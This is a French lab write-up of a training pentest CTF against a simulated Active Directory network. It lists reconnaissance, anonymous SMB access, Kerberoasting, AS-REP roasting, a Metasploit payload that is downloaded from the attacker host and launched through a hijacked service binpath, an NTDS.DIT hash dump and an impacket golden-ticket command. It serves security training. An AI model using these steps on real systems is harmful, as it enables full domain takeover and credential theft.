# Réalisation d'un pentest dans un environnement d'entreprise simplifié

Un client vous a missionné pour réaliser un pentest de son environnement interne. Vous devez élaborer un scénario de compromission de l'environnement tout entier, remonter chacune des vulnérabilités rencontrées et écrire une synthèse managériale qui permettra a une personne non technique de comprendre les risques présents sur le périmètre.

## Auteur

Roblot Jean-Philippe - <jroblot.simplon@proton.me>
Drula Kevin - <kdrula.simplon@proton.me>

## Version

04/03/2024 - V1R0

## Releases

![Static Badge](https://img.shields.io/badge/Kali%20Linux-2023.4-violet)
![Static Badge](https://img.shields.io/badge/Windows%20Server-2016-blue)
![Static Badge](https://img.shields.io/badge/Windows%2010-22H2-blue)

Powered by <https://shields.io>

## Contexte

En tant que analyste SOC, réalisation d'un CTF comprenant les attaques Active Directory les plus courantes.  
Le réseau comprend:
- Deux windows 10
- Deux windows serveur 2016 (Controleur de domaine + serveur)

Les quatres machines peuvent être entièrement compromises.
Afin de suivre en temps réel la progression des équipes, un environnnement type CTFd a été mis en place. Il y a 9 challenges a réaliser.
A chaque challenge réussi, il faudra prendre des notes technique sur la manière dont vous avez exploité les vulnérabilités.

## Activités

Reconnaissance de l'nvironnement avec Nmap

![alt text](image-28.png)
![alt text](image-29.png)
![alt text](image-30.png)
![alt text](image-32.png)
On identifie le contrôleur de domaine avec Kerberos sur le port 88
![alt text](image-31.png)

Utiliser le compte anonyme par défaut de l'AD pour rechercher des dossiers partagés
![alt text](image-53.png)

Utiliser SMBClient avec l'utilisateur anonyme pour voir le contenu du dossier "John"
![alt text](image-54.png)

Compte.txt  
![alt text](image-33.png)

Todo.txt   
![alt text](image-34.png)

Récupérer la liste d'utilisateurs de l'AD
![alt text](image-35.png)

Tester les mdp faible : user=mdp
![alt text](image-36.png)

Utiliser WinRM avec le compte "John"
![alt text](image-38.png)  
Scan des vuln avec WinPEAS
Récupérer la SAM

Identifier les comptes possédant un SPN
![alt text](image-37.png)

Utiliser ce compte pour générer un ticket et augmenter nos privilèges
![alt text](image-40.png)

Récupérer le mot de passe grâce au ticket avec John the Ripper
![alt text](image-39.png)

Chercher dans l'AD un utilisateur avec pre-auth désactivé et récupérer son mot de passe
![alt text](image-41.png)
![alt text](image-42.png)
![alt text](image-43.png)


Créer un payload avec Metasploit > msvenom
![alt text](pour_jp_et_sans_contexe.jpg)

Set le payload avec msf6 et le mettre en écoute
![alt text](metasploit.jpg)

Configurer le binpath d'un service vulnérable pour lancer le payload côté client (téléchargé au préalable depuis la Kali)


```bash
# Passer la Kali en mode server
python3 -m hhtp.server 80

#evil-WinRM 192.168.0.201
wget http://192.168.0.97/cheh.exe
sc.exe config John_work39 binpath= "C:\Users\John\Documents\cheh.exe"
./cheh.exe
start-service John_work39
```

![alt text](image-44.png)
![alt text](image-45.png)

NTDS.DIT pour récupérer le hash de KRBTGT

![alt text](image-46.png)
![alt text](image-47.png)

![alt text](image-48.png)

install krb5-user  
![alt text](image-49.png)

Générer le golden ticket avec Ticketer

```bash
impacket-ticketer -domain secure.intra -domain-sid S-1-5-21-2931287595-4144871426-66956829 -aesKey 0b994712e4f81aa3e8ce3a5faf2c88fc894ecbaa6109a30207dc619ea532ff3a -dc-ip 192.168.0.200 -debug Administrateur
```

export ticket  
![alt text](image-50.png)

Ajouter le hostname dans /etc/hosts pour résoudre le domaine
![alt text](image-52.png)

Utiliser le Golden Ticket pour se connecter au contrôleur de domaine
![alt text](image-51.png)

![alt text](image-55.png)

### Sources

https://book.hacktricks.xyz/welcome/readme  
https://johndcyber.com/how-to-create-a-reverse-tcp-shell-windows-executable-using-metasploit-56d049007047